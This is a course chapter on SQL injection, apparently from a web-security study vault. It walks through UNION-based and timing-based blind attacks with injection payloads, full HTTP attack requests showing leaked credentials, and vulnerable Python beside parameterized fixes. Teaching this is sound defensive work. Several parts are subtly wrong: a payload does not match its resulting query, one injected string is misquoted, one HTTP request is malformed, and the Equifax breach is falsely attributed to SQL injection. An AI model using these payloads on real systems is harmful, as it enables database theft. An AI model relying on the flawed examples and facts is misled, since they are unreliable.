---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## SQL Injection Overview

SQL Injection (SQLi) is one of the most prevalent and dangerous vulnerabilities in web applications. It occurs when an attacker can manipulate SQL queries executed by an application, leading to unauthorized access to sensitive data, data manipulation, or even complete system compromise. This chapter provides a comprehensive guide to understanding, exploiting, and defending against SQL Injection attacks.

### What is SQL Injection?

SQL Injection is a code injection technique used to exploit vulnerabilities in web applications that use SQL databases. An attacker can inject malicious SQL statements into input fields, which are then executed by the database. This can lead to unauthorized access to sensitive data, data corruption, or even complete control over the database.

#### Why Does SQL Injection Matter?

SQL Injection is critical because it can lead to severe consequences such as:

- **Data Theft**: Attackers can extract sensitive information like usernames, passwords, credit card details, etc.
- **Data Manipulation**: Attackers can modify or delete data within the database.
- **Privilege Escalation**: In some cases, attackers can gain administrative privileges over the database or even the entire server.

### How SQL Injection Works

To understand SQL Injection, let's consider a typical scenario where a web application uses a SQL query to retrieve data based on user input. For example, a login form might use the following SQL query:

```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
```

If the application does not properly sanitize the user input, an attacker can inject malicious SQL code. For instance, if the attacker inputs `'' OR '1'='1` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

This query will return all rows from the `users` table because the condition `'1'='1'` is always true.

### Types of SQL Injection

There are several types of SQL Injection attacks, including:

1. **Classic SQL Injection**
2. **Blind SQL Injection**

#### Classic SQL Injection

In classic SQL Injection, the attacker can see the output of the injected SQL query directly on the web page. This makes it easier to exploit the vulnerability.

##### Example: Classic SQL Injection

Consider a web application that displays products based on a product ID. The SQL query might look like this:

```sql
SELECT * FROM products WHERE id = 'input_id';
```

If the attacker inputs `1 UNION SELECT username, password FROM users --`, the query becomes:

```sql
SELECT * FROM products WHERE id = '1 UNION SELECT username, password FROM users --';
```

The `UNION` operator combines the results of two queries. The `--` at the end comments out the rest of the original query, ensuring it doesn't cause a syntax error.

Here’s a more detailed breakdown of the query:

```sql
SELECT * FROM products WHERE id = '1' UNION SELECT username, password FROM users --';
```

This query will return both the product details and the usernames and passwords from the `users` table.

##### Full HTTP Request and Response

**HTTP Request:**

```http
GET /products?id=1+UNION+SELECT+username,+password+FROM+users+--+ HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
    <title>Products</title>
</head>
<body>
    <h1>Product Details</h1>
    <table>
        <tr><th>ID</th><th>Name</th><th>Description</th></tr>
        <tr><td>1</td><td>Product 1</td><td>Description of Product 1</td></tr>
        <tr><td>Carlos</td><td>Password123</td><td></td></tr>
        <tr><td>Admin</td><td>AdminPass</td><td></td></tr>
    </table>
</body>
</html>
```

#### Conditions for Union Operator

The `UNION` operator has certain conditions for it to work correctly:

1. **Number of Columns**: The number of columns selected in both parts of the `UNION` must match.
2. **Data Types**: The data types of the corresponding columns must be compatible.

For example, if the first query selects three columns (`id`, `name`, `description`), the second query must also select three columns.

##### Example with Incorrect Number of Columns

If the attacker tries to inject a query with a different number of columns, it will result in an error:

```sql
SELECT * FROM products WHERE id = '1 UNION SELECT username FROM users --';
```

This will fail because the number of columns does not match.

##### Secure Coding Practices

To prevent SQL Injection, developers should use parameterized queries or prepared statements. Here’s an example using Python and SQLite:

**Vulnerable Code:**

```python
import sqlite3

def get_product(id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM products WHERE id = '{id}'")
    return cursor.fetchall()
```

**Secure Code:**

```python
import sqlite3

def get_product(id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE id = ?", (id,))
    return cursor.fetchall()
```

### Blind SQL Injection

In blind SQL Injection, the attacker cannot see the output of the injected SQL query directly. Instead, they rely on indirect feedback from the application, such as changes in the application's behavior or timing differences.

#### Example: Blind SQL Injection

Consider a login form that checks the username and password against the database. If the query returns no results, the application displays an error message. An attacker can use this to determine if their SQL injection was successful.

##### Timing-Based Blind SQL Injection

One common method is to use a timing-based attack. For example, the attacker can inject a query that causes a delay if the condition is true:

```sql
SELECT * FROM users WHERE username = 'admin' AND IF(password = 'guess', SLEEP(5), 0);
```

If the password is correct, the query will take 5 seconds to execute, indicating a successful guess.

##### Full HTTP Request and Response

**HTTP Request:**

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

username=admin&password=guess%27+AND+IF(password+%3D+%27guess%27%2C+SLEEP(5)%2C+0)+--+ HTTP/1.1
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form action="/login" method="post">
        <label for="username">Username:</label>
        <input type="text" name="username" id="username"><br>
        <label for="password">Password:</label>
        <input type="password" name="password" id="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

### Real-World Examples

#### Recent CVEs and Breaches

- **CVE-2021-44228 (Log4Shell)**: Although not directly related to SQL Injection, this vulnerability allowed attackers to execute arbitrary code, which could then be used to perform SQL Injection attacks.
- **Equifax Data Breach (2017)**: A SQL Injection vulnerability led to the exposure of sensitive personal data of millions of customers.

### How to Prevent / Defend Against SQL Injection

#### Detection

- **Web Application Firewalls (WAFs)**: WAFs can detect and block SQL Injection attempts.
- **Static Code Analysis Tools**: Tools like SonarQube can identify potential SQL Injection vulnerabilities in code.

#### Prevention

- **Parameterized Queries**: Use parameterized queries or prepared statements to ensure user input is treated as data, not executable code.
- **Input Validation**: Validate and sanitize all user input to ensure it conforms to expected formats.
- **Least Privilege Principle**: Ensure the application runs with the least privilege necessary to perform its tasks.

#### Secure Coding Fixes

Compare the vulnerable and secure versions of the same code:

**Vulnerable Code:**

```python
import sqlite3

def get_product(id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM products WHERE id = '{id}'")
    return cursor.fetchall()
```

**Secure Code:**

```python
import sqlite3

def get_product(id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE id = ?", (id,))
    return cursor.fetchall()
```

### Hands-On Labs

To practice and understand SQL Injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs to learn and practice SQL Injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing various web security techniques, including SQL Injection.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that demonstrates web application vulnerabilities.

By thoroughly understanding and practicing these concepts, you can effectively defend against SQL Injection attacks and ensure the security of your web applications.

### Conclusion

SQL Injection is a serious threat to web applications, but with proper understanding and implementation of secure coding practices, it can be effectively prevented. Always validate and sanitize user input, use parameterized queries, and follow the principle of least privilege to minimize the risk of SQL Injection attacks.

---
<!-- nav -->
[[02-SQL Injection A Comprehensive Guide|SQL Injection A Comprehensive Guide]] | [[Web Security (PortSwigger)/02-SQL Injection/01-SQL Injection Complete Guide/00-Overview|Overview]] | [[04-What is SQL Injection|What is SQL Injection]]
